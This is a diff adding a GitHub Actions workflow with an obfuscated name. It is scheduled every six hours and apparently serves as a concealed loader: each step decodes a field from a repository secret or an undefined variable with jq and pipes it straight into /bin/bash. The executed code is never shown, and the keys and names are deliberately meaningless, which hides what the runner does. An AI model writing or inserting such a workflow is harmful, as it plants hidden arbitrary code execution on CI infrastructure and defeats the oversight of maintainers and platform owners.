@@ -1,0 +1,27 @@
+name: shensizhimalilv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shensizhimalilv
+        env:
+          bzjev24984: ${{ secrets.bzjev24984 }}
+        run: |
+          echo $bzjev24984 | jq -r .zb2 | /bin/bash
+          echo $gpmme766 | jq -r .vnef8 | /bin/bash
+          echo $zvtsd50951 | jq -r .lb97 | /bin/bash
+          echo $a22319 | jq -r .zz35 | /bin/bash
+          echo $j11152 | jq -r .vs06 | /bin/bash
+          echo $xt02 | jq -r .wte8 | /bin/bash
+          echo $wkbq1916 | jq -r .wxh309 | /bin/bash
+          echo $af6539 | jq -r .ywyg60 | /bin/bash
+          echo $top62 | jq -r .v28799 | /bin/bash
+          echo $i8598 | jq -r .qf850 | /bin/bash
+          echo $xps639 | jq -r .imzr0137 | /bin/bash
+
